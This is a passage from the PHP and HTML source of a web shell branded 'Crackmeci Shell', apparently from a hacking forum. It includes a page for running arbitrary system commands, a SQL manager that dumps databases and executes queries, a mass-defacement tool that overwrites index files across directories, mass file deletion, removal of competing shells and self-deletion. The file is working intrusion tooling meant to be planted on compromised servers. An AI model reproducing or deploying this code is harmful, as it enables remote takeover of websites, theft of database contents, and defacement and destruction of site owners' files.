                                }

                                hr {
                                    width: 100% !important;
                                }

                                @media (max-width: 813px) {
                                    table {
                                        border: 0 !important;
                                        position: relative !important;
                                        width: 100% !important;
                                        display: block;
                                    }

                                    tbody,
                                    tr {
                                        position: relative !important;
                                        width: 100% !important;
                                        display: block;
                                    }

                                    th,
                                    td {
                                        text-align: left !important;
                                        padding: 8px !important;
                                        display: block !important;
                                        width: 100% !important;
                                        box-sizing: border-box !important;
                                    }

                                    .phpinfo .e {
                                        width: 100% !important;
                                    }

                                    tr {
                                        margin-bottom: 5px !important;
                                    }

                                    th {
                                        background-color: #f2f2f2;
                                    }

                                    .v {
                                        width: 100% !important;
                                        max-width: none !important;
                                    }
                                }
                            </style>

                            <div class="phpinfo w-full container-fluid p-2">
                                <?php echo trim(phpinfo(), "1"); ?>
                            </div>

                            <script>
                                let imgs = document.querySelectorAll(".phpinfo a img");
                                imgs[0].style = "width:32px;height:32px";
                                imgs[0].src = "https://raw.githubusercontent.com/Crackmeci/shell/main/favicon.png";
                            </script>
                        </div>
                    <?php endif; ?>


                    <?php if(isset($_GET["page"]) && $_GET["page"] == "execute"): ?>
                        <div class="container-fluid mx-auto">
                            <form action="" id="executor" method="post">
                                <textarea name="content" id="command_output" class="w-full h-[360px] border rounded-md p-2 outline-none" readonly></textarea>
                        
                                <div id="commandAlert" class="alert my-2 ">
                                    
                                </div>
                                <div class="flex gap-2 items-center ">
                                    <input type="text" name="command" id="command" class="w-[75%] px-4 py-2 border-none outline-none rounded-md">
                                    <button type="submit" name="execute" id="executeBtn" class="bg-blue-500 text-white w-[25%] px-4 py-2 rounded-md "><i class="fa fa-terminal"></i> <?php echo $languages[$systemLang]["executePage_btnText"]; ?></button>
                                </div>
                            </form>

                            <style>
                                @keyframes spin {
                                    0% { transform: rotate(0deg); }
                                    100% { transform: rotate(360deg); }
                                }

                                .spinner{
                                    animation: spin 3s linear infinite;

                                }
                            </style>
                            <script>
                                $(document).ready(function() {
                                    $("#executor").submit(function(e) {
                                        e.preventDefault();
                                        var command = $("#command").val();

                                        var executeBtn = $("#executeBtn");

                                        executeBtn.prop("disabled", true).html('<i class="fa fa-spinner fa-spin spinner"></i> <?php echo $languages[$systemLang]["executePage_btnText"]; ?>...');


                                        $.ajax({
                                            type: "POST",
                                            url: "?ajax", 
                                            data: { command: command, execute: true },
                                            success: function(result) {
                                                result = JSON.parse(result);
                                                $("#command_output").val(result.response);
                                                if(result.type == "success"){
                                                    $("#commandAlert").html('<div class="w-full bg-green-500 p-2 flex items-center text-white gap-2 font-semibold"><i class="fa fa-check"></i> <?php echo $languages[$systemLang]["command_successText"]; ?></div>')
                                                }else{
                                                    $("#commandAlert").html('<div class="w-full bg-red-500 p-2 flex items-center text-white gap-2 font-semibold"><i class="fa fa-times"></i> <?php echo $languages[$systemLang]["command_errorText"]; ?></div>')
                                                }
                                            },
                                            complete: function () {
                                                executeBtn.prop("disabled", false).html('<i class="fa fa-terminal"></i> <?php echo $languages[$systemLang]["executePage_btnText"]; ?>');
                                            }
                                        });
                                    });
                                });
                            </script>

                        </div>
                    <?php endif; ?>


                    <?php if (isset($_GET["page"]) && $_GET["page"] == "sqlManager") :?>
                        <div class="container-fluid m-auto">
                            <?php if (!isset($_GET["user"]) || !isset($_GET["host"]) || !isset($_GET["password"])) : ?>
                                <div class="div border-[1px] p-2 border-[rgba(255,255,255,0.1)] max-w-[315px] w-[315px] mx-auto">
                                    <h1 class="text-xl font-bold mb-4 mt-4 text-[#ccc] hover:text-white text-center"><i class="fa fa-database"></i> <?php echo $languages[$systemLang]["sqlManager_title"]; ?></h1>

                                    <form action="" method="get" class="w-full">
                                        <?php echo generateInputField($languages[$systemLang]["sqlManager_hostHolder"], "host", "fa-server"); ?>
                                        <?php echo generateInputField($languages[$systemLang]["sqlManager_sqlUser"], "user", "fa-user"); ?>
                                        <?php echo generateInputField($languages[$systemLang]["sqlManager_sqlPassword"], "password", "fa-key", "password"); ?>
                                        <input type="hidden" name="page" value="sqlManager">
                                        <button type="submit" class="w-full p-2 mt-2 bg-blue-500 text-white font-semibold"><?php echo $languages[$systemLang]["sqlManager_connectBtn"]; ?></button>
                                    </form>
                                </div>
                            <?php else : ?>
                                <?php
                                $sqlManager = new SQLManager($_GET["host"], $_GET["user"], $_GET["password"]);
                                $databases = $sqlManager->showDatabases();
                                ?>
                                <div class="w-full flex gap-2 border-[1px] p-2 border-[rgba(255,255,255,0.1)] flex-wrap">
                                    <div class="flex-1 min-w-[315px] bg-[var(--dark-color)] h-[400px] overflow-y-scroll">
                                        <ul>
                                            <?php foreach ($databases as $database) : ?>
                                                <li class="text-white font-semibold text-lg border-b-[1px] border-[rgba(255,255,255,0.1)] p-2">
                                                    <a href="<?php echo appendDatabaseParam($_SERVER["REQUEST_URI"],$database); ?>"><i class="fa fa-database"></i> <?php echo $database; ?></a>
                                                </li>
                                            <?php endforeach; ?>
                                        </ul>
                                    </div>
                                    

                                    <?php if(isset($_GET["database"])): $sqlManager->selectDatabase($_GET["database"]);$tables = $sqlManager->showTables(); ?>
                                        <div class="flex-1 min-w-[315px] bg-[var(--dark-color)] h-[400px] overflow-y-scroll">
                                            <ul>
                                            <?php foreach($tables as $table): ?>
                                                <li class="text-white font-semibold text-lg border-b-[1px] border-[rgba(255,255,255,0.1)] p-2">
                                                    <a href="<?php echo appendTableParam($_SERVER["REQUEST_URI"],$table); ?>"><i class="fa fa-table"></i> <?php echo $table; ?></a>
                                                </li>
                                            <?php endforeach; ?>
                                            </ul>
                                        </div>
                                    <?php endif; ?>
                                </div>

                                <?php if(isset($_GET["table"])): $columns = $sqlManager->fetchColumns($_GET["table"]);  ?>
                                    <div class="w-full">
                                        <?php if(count($columns) > 0): ?>
                                            <div class="table-container mt-2">
                                                <table class="border-[1px] border-[rgba(255,255,255,0.1)]">
                                                    <?php $theads = array_keys($columns[0]); ?>
                                                    <thead>
                                                        <tr>
                                                            <?php foreach($theads as $thead): ?>
                                                                <th class="text-white font-bold border-[1px] border-[rgba(255,255,255,0.1)]"><?php echo $thead; ?></th>
                                                            <?php endforeach; ?>
                                                        </tr>
                                                    </thead>

                                                    <tbody>
                                                        <?php foreach($columns as $row): ?>
                                                            <tr>
                                                                <?php foreach($row as $value): ?>
                                                                    <td><textarea class="outline-none  p-2 bg-[var(--background-color)] text-white border-[1px] border-[rgba(255,255,255,0.1)]" cols="30" rows="10" readonly><?php echo $value; ?></textarea></td>
                                                                <?php endforeach; ?>
                                                            </tr>
                                                        <?php endforeach; ?>
                                                    </tbody>
                                                </table>
                                            </div>
                                        <?php else: ?>
                                            <div class="w-full bg-red-500 p-2 font-semibold text-white my-3"><i class="fa fa-exclamation-triangle"></i> <?php echo $languages[$systemLang]["sql_notFound"]; ?></div>
                                        <?php endif; ?>
                                    </div>
                                <?php endif; ?>
                                <br>
                                <?php if(isset($_GET["database"])): ?>
                                <form action="" method="post">
                                    <?php 
                                        if(isset($_POST["exportDb"])):
                                            $name = $_GET["database"].'.sql';
                                            $sqlManager->createDatabaseDump($name); ?>

                                            <a id="downloader" href="<?php echo $name; ?>"></a>
                                            <script>
                                                let downloader = document.querySelector("#downloader");

                                                downloader.click();
                                            </script>
                                    <?php endif; ?>
                                    <button name="exportDb" class="w-full p-2 rounded-md bg-blue-500 text-white font-bold" type="submit"><i class="fa fa-save"></i> <?php echo $languages[$systemLang]["sqlManager_exportDb"]; ?>: <?php echo $_GET["database"]; ?></button>
                                </form>
                                <?php endif; ?>
                                <form action="" method="post">
                                    <?php echo generateInputField($languages[$systemLang]["sqlManager_executeQuery"],"query","fa fa-terminal"); ?>
                                    <?php
                                        if(isset($_POST["executeQuery"])){
                                            $query = trim($_POST["query"]);
                                            $sqlManager->query($query);
                                            header("Refresh:0");
                                        }
                                    ?>
                                    <button name="executeQuery" class="p-2 w-full bg-blue-500 text-white font-bold my-2"><?php echo $languages[$systemLang]["sqlManager_executeBtn"]; ?></button>
                                </form>
                            <?php endif; ?>
                        </div>
                    <?php endif; ?>

                    <?php if(isset($_GET["page"]) && $_GET["page"] == "about"): ?>
                        <div class="container-fluid mx-auto">
                            <div class="w-full flex justify-center bg-[#14161d] p-2 border-[1px] border-[rgba(255,255,255,0.1)]">
                                <div class="text-center">
                                    <a href="https://turkhackteam.org/">
                                        <img src="https://github.com/Crackmeci/shell/blob/main/logo.png?raw=true" alt="">
                                    </a>
                                    <h1 class="text-white font-bold my-2 text-3xl">Crackmeci Shell</h1>
                                    <h2 class="text-[#ccc] font-bold mt-2 text-lg"><?php echo $languages[$systemLang]["aboutPage_mainText"]; ?></h2>
                                    <div class="flex items-center gap-2 justify-center mt-2">
                                        <a class="text-white text-lg font-bold rounded-full w-[32px] h-[32px] border-[1px] flex items-center justify-center border-[rgba(255,255,255,0.1)]" href="">
                                            <i class="fa fa-envelope"></i>
                                        </a>
                                        <a class="" href="https://turkhackteam.org/uye/crackmeci.920526/">
                                            <img src="https://github.com/Crackmeci/shell/blob/main/favicon.png?raw=true" alt="">
                                        </a>
                                    </div>
                                <h2 class="text-green-500 text-3xl mt-3 font-bold border-t-[1px] p-2 border-[rgba(255,255,255,0.1)]"><?php echo date("Y"); ?></h2>
                                </div>
                            </div>
                        </div>
                    <?php endif; ?>

                    <?php if(isset($_GET["page"]) && $_GET["page"] == "encrypt"): ?>
                        <div class="container-fluid mx-auto">
                            <h1 class="text-xl font-bold mb-4 mt-4 text-[#ccc] hover:text-white"><?php echo $languages[$systemLang]["encryptPage_title"]; ?></h1>
                            <form id="encrypter" method="post">
                                <textarea id="encryptText" class="w-full h-[360px] border rounded-md p-2 outline-none"></textarea>
                                <div class="flex">
                                    <select class="w-full p-2 rounded my-2 block w-full outline-none border-none" name="encryptType" id="encryptType">
                                        <option value="rot13">Rot13</option>
                                        <option value="base64">Base64</option>
                                        <option value="md5">MD5</option>
                                        <option value="sha256">SHA256</option>
                                        <option value="sha1">SHA1</option>
                                        <option value="url">Url</option>
                                    </select>
                                </div>
                                <div class="my-2" id="encryptAlert"></div>
                                <button id="encryptBtn" class="encrypt p-2 text-white bg-blue-500 rounded-md mb-2 block w-full"><i class="fa fa-key"></i> <?php echo $languages[$systemLang]["encryptPage_btnText"]; ?></button>
                                <textarea id="willText" class="w-full h-[360px] border rounded-md p-2 outline-none"></textarea>
                                <script>
                                    $(document).ready(function() {
                                        $("#encrypter").submit(function(e) {
                                            e.preventDefault();
                                            var encryptText = $("#encryptText").val();
                                            var encryptType = $("#encryptType").val();

                                            var encryptBtn = $("#encryptBtn");

                                            encryptBtn.prop("disabled", true).html('<i class="fa fa-spinner fa-spin spinner"></i> <?php echo $languages[$systemLang]["encryptPage_btnText"]; ?>...');


                                            $.ajax({
                                                type: "POST",
                                                url: "?ajax", 
                                                data: { type: encryptType, encrypt: true , text: encryptText},
                                                success: function(result) {
                                                    result = JSON.parse(result);
                                                    $("#willText").val(result.response);
                                                    if(result.type == "success"){
                                                        $("#encryptAlert").html('<div class="w-full bg-green-500 p-2 flex items-center text-white gap-2 font-semibold"><i class="fa fa-check"></i> <?php echo $languages[$systemLang]["encrypt_successText"]; ?></div>')
                                                    }else{
                                                        $("#encryptAlert").html('<div class="w-full bg-red-500 p-2 flex items-center text-white gap-2 font-semibold"><i class="fa fa-times"></i> <?php echo $languages[$systemLang]["encrypt_errorText"]; ?></div>')
                                                    }
                                                },
                                                complete: function () {
                                                    encryptBtn.prop("disabled", false).html('<i class="fa fa-terminal"></i> <?php echo $languages[$systemLang]["encryptPage_btnText"]; ?>');
                                                }
                                            });
                                        });
                                    });
                                </script>
                            </form>

                        </div>
                    <?php endif; ?>

                    <?php if(isset($_GET["page"]) && $_GET["page"] == "shellRemover"): ?>
                        <div class="container-fluid flex justify-center flex-wrap gap-2">

                        <?php
                            if (isset($_POST["shellRemover"])) {
                                $folder = trim($_POST["folder"]);
                                $files = scanFiles($folder);
                                $shells = [];

                                foreach ($files as $file) {
                                    $status = findShells($file);
                                    if(basename($file) == $config["base_url"]){
                                        $status = 0;
                                    }

                                    if ($status != 0) {
                                        $shells[] = $status;
                                    }
                                }

                                if (count($shells) > 0) { ?>
                                    <div class="w-[600px] mx-auto p-2 border-[1px] border-[rgba(255,255,255,0.1)] text-center">
                                        <h2 class="text-[#ccc] hover:text-white font-bold mt-2 p-2 text-3xl border-b-[1px] border-[rgba(255,255,255,0.1)]"><?php echo $languages[$systemLang]["shellRemover_foundTitle"]; ?></h2>
                                        <div class="bg-blue-400 text-black font-semibold text-sm p-2 my-2 rounded-md"><i class="fa fa-info-circle"></i> <?php echo $languages[$systemLang]["shellRemover_saveInfo"]; ?></div>
                                        <form action="" method="post">
                                            <?php 
                                                if(isset($_POST["deleteAll"])){
                                                    foreach($shells as $shell){
                                                        chmod($shell, 0666);
                                                        @unlink($shell);
                                                    }
                                                    header("Refresh:0");
                                                    exit();
                                                }
                                            ?>
                                            <button name="deleteAll" class="outline-none border-none bg-blue-500 p-2 rounded-md text-white fond-bold mt-2 w-full" type="submit"><?php echo $languages[$systemLang]["shellRemover_deleteAll"]; ?></button>
                                        </form>
                                        <?php foreach ($shells as $shell): ?>
                                            <div class="p-2 border-[1px] border-[rgba(255,255,255,0.1)] mt-2">
                                                <span class="text-white font-bold p-2 "><?php echo $languages[$systemLang]["shellRemover_filePath"] . ':' . $shell; ?></span>
                                                <small class="text-white block"><?php echo $languages[$systemLang]["shellRemover_noticeText"]; ?></small>
                                                <form action="" method="post">
                                                    <?php 
                                                        if(isset($_POST["delete"])){
                                                            $file = $_POST["file"];
                                                            if(file_exists($file)){
                                                                chmod($file,0666);
                                                                @unlink($file);
                                                            }
                                                        }
                                                    ?>
                                                    <input type="hidden" name="file" value="<?php echo $shell; ?>">
                                                    <button name="delete" class="outline-none border-none bg-blue-500 p-2 rounded-md text-white fond-bold text-sm mt-2 w-full" type="submit"><?php echo $languages[$systemLang]["shellRemove_delete"]; ?></button>
                                                </form>
                                            </div>
                                        <?php endforeach; ?>

                                    </div>
                                <?php } } ?>

                            
                            <div class="w-[600px] h-[max-content] inline mx-auto p-2 border-[1px] border-[rgba(255,255,255,0.1)] text-center">
                                <h1 class="text-xl font-bold mb-4 mt-4 text-[#ccc] hover:text-white"><?php echo $languages[$systemLang]["shellRemover_pageTitle"]; ?></h1>
                                <form action="" method="post">
                                    <?php echo generateInputField($languages[$systemLang]["shellRemover_folderPath"], "folder", "fa-folder-open","text",__DIR__); ?>
                                    <button name="shellRemover" type="submit" class="outline-none border-none bg-blue-500 p-2 rounded-md text-white fond-bold mt-2 w-full"><i class="fas fa-trash-alt"></i> <?php echo $languages[$systemLang]["shellRemover_btnText"]; ?></button>
                                </form>
                            </div>

                            
                        </div>    
                    <?php endif; ?>

                    <?php if(isset($_GET["page"]) && $_GET["page"] == "massDeface"): ?>
                        <div class="container-fluid">
                            <div class="w-[600px] h-[max-content] inline mx-auto p-2 text-center">
                                <h1 class="text-xl font-bold mb-4 mt-4 text-[#ccc] hover:text-white"><?php echo $languages[$systemLang]["massDeface_pageTitle"]; ?></h1>
                                <form action="" method="post">
                                    <?php echo generateInputField($languages[$systemLang]["massDeface_folderPath"], "folder", "fa-folder-open","text",__DIR__); ?>
                                    <?php echo generateInputField($languages[$systemLang]["massDeface_fileName"], "fileName", "fa-file","text","index.php"); ?>
                                    <div class="flex mt-2">
                                        <div class="prepend flex gap-2 bg-blue-500 min-w-[42px] items-center justify-center p-3">
                                            <i class="fa fa-pen text-lg text-white"></i>
                                        </div>
                                        <select class=" p-2  w-full outline-none" name="contentType" id="contentType">
                                            <option value="fromFile"><?php echo $languages[$systemLang]["massDeface_fromFile"]; ?></option>
                                            <option value="fromText"><?php echo $languages[$systemLang]["massDeface_fromText"]; ?></option>
                                        </select>
     
                                    </div>

                                    <?php echo generateInputField($languages[$systemLang]["massDeface_fileName"], "file", "fa-file","text","","fromFile"); ?>
                                    <?php echo generateTextareaField($languages[$systemLang]["massDeface_fileContent"], "content", "fa-pen","","fromText"); ?>
                                                        
                                    <script>
                                            let contentType =document.querySelector("#contentType");
                                            let fromFile =document.querySelector("#fromFile");
                                            let fromText =document.querySelector("#fromText");

                                            fromText.style.display = "none";
                                            contentType.addEventListener("change",(e)=>{
                                                if(e.target.value == "fromFile"){
                                                    fromFile.style.display = "flex";
                                                    fromText.style.display = "none";
                                                }else{
                                                    fromFile.style.display = "none";
                                                    fromText.style.display = "flex";
                                                }
                                            })
                                    </script>

                                    <?php
                                        if(isset($_POST["massDeface"])){
                                            $fileName = trim($_POST["fileName"]);
                                            $folder = trim($_POST["folder"]);
                                            $contentType = trim($_POST["contentType"]);
                                            $files = defacingFiles($folder,$fileName);

                                            if($contentType == "fromFile"){
                                                $file = trim($_POST["file"]);
                                                if(file_exists($file)){
                                                    $content = file_get_contents($file);
                                                }else{
                                                    $content = "";
                                                }
                                            }else{
                                                $content = trim($_POST["content"]);
                                            }

                                            foreach($files as $file){
                                                file_put_contents($file,$content);
                                            }
                                            header("Refresh:0");
                                            exit();
                                        }           
                                        
                                        if(isset($_POST["massDelete"])){
                                            $fileName = trim($_POST["fileName"]);
                                            $folder = trim($_POST["folder"]);

                                            $files = defacingFiles($folder,$fileName);

                                            foreach($files as $file){
                                                @unlink($file,$content);
                                            }
                                        }
                                    ?>
                                    <div class="w-full bg-blue-400 font-bold text-md p-2 mt-2"><i class="fa fa-info-circle"></i> <?php echo $languages[$systemLang]["massDeface_noticeText"]; ?></div>
                                    <button name="massDeface" type="submit" class="outline-none border-none bg-blue-500 p-2 rounded-md text-white fond-bold mt-2 w-full"><i class="fas fa-pen-alt"></i> <?php echo $languages[$systemLang]["massDeface_btnText"]; ?></button>
                                    <button name="massDelete" type="submit" class="outline-none border-none bg-blue-500 p-2 rounded-md text-white fond-bold mt-2 w-full"><i class="fas fa-trash"></i> <?php echo $languages[$systemLang]["massDeface_deleteText"]; ?></button>
                                </form>
                            </div>
                        </div>
                    <?php endif; ?>

                    <?php if(isset($_GET["page"]) && $_GET["page"] == "deleteYou"): ?>
                        <div class="container-fluid">
                            <div class="w-[600px] h-[max-content] inline mx-auto p-2 text-center">
                                <h1 class="text-xl font-bold mb-4 mt-4 text-[#ccc] hover:text-white"><?php echo $languages[$systemLang]["deleteYou_pageTitle"]; ?></h1>
                                <form action="" method="post" onsubmit="return confirmation();">
                                    <?php 
                                        if(isset($_POST["deleteYourself"])){
                                            $filePath = __DIR__.DIRECTORY_SEPARATOR.$config["base_url"];
                                            @unlink($filePath);
                                            header("Location:".$config["site_url"]);
                                            exit();
                                        }
                                    ?>
                                    <button type="submit" name="deleteYourself" class="p-2 mt-2 bg-blue-500 text-white font-bold w-full outline-none border-none" type="submit"><i class="fa fa-trash"></i> <?php echo $languages[$systemLang]["deleteYou_btnText"]; ?></button>
                                </form>

                                <script>
                                    function confirmation() {
                                        var confirmation = confirm("<?php echo $languages[$systemLang]["deleteYou_confirmation"]; ?>");

                                        return confirmation;
                                    }
                                </script>
                            </div>
                        </div>
                    <?php endif; ?>


                </div>

                <?php if(isset($_SESSION["theme"]) && $_SESSION["theme"] == "alternative"): ?>
                    <div class="absolute left-0 top-0 w-full h-full" style="z-index:-1;" id="particles-js"></div>

                    <script>
                        particlesJS('particles-js', {
                            particles: {
                                number: {
                                    value: 100,
                                    density: {
                                        enable: true,
                                        value_area: 800 
                                    }
                                },
                                color: {
                                    value: '#ffffff' 
                                },
                                shape: {
                                    type: 'circle', 
                                    stroke: {
                                        width: 0,
                                        color: '#ffffff'
                                    },
                                    polygon: {
                                        nb_sides: 5
                                    }
                                },
                                opacity: {
                                    value: 0.5, 
                                    random: false,
                                    anim: {
                                        enable: false,
                                        speed: 1,
                                        opacity_min: 0.1,
                                        sync: false
                                    }
                                },
                                size: {
                                    value: 3,
                                    random: true,
                                    anim: {
                                        enable: false,
                                        speed: 40,
                                        size_min: 0.1,
                                        sync: false
                                    }
                                },
                                line_linked: {
                                    enable: true,
                                    distance: 150,
                                    color: '#ffffff',
                                    opacity: 0.4,
                                    width: 1
                                },
                                move: {
                                    enable: true,
                                    speed: 6, 
                                    direction: 'none',
                                    random: false,
                                    straight: false,
                                    out_mode: 'out',
                                    bounce: false,
                                    attract: {
                                        enable: false,
                                        rotateX: 600,
                                        rotateY: 1200
                                    }
                                }
                            },
                            interactivity: {
                                detect_on: 'canvas',
                                events: {
                                    onhover: {
                                        enable: true,
                                        mode: 'grab'
                                    },
                                    onclick: {
                                        enable: true,
                                        mode: 'push'
                                    },
                                    resize: true
                                },
                                modes: {
                                    grab: {
                                        distance: 140,
                                        line_linked: {
                                            opacity: 1
                                        }
                                    },
                                    bubble: {
                                        distance: 400,
                                        size: 40,
                                        duration: 2,
                                        opacity: 8,
                                        speed: 3
                                    },
                                    repulse: {
                                        distance: 200,
                                        duration: 0.4
                                    },
                                    push: {
                                        particles_nb: 4
                                    },
                                    remove: {
                                        particles_nb: 2
                                    }
                                }
                            },
                            retina_detect: true
                        });
                    </script>
                <?php endif; ?>
            </div>
        <?php endif; ?>
    <?php endif; ?>
</body>
</html>
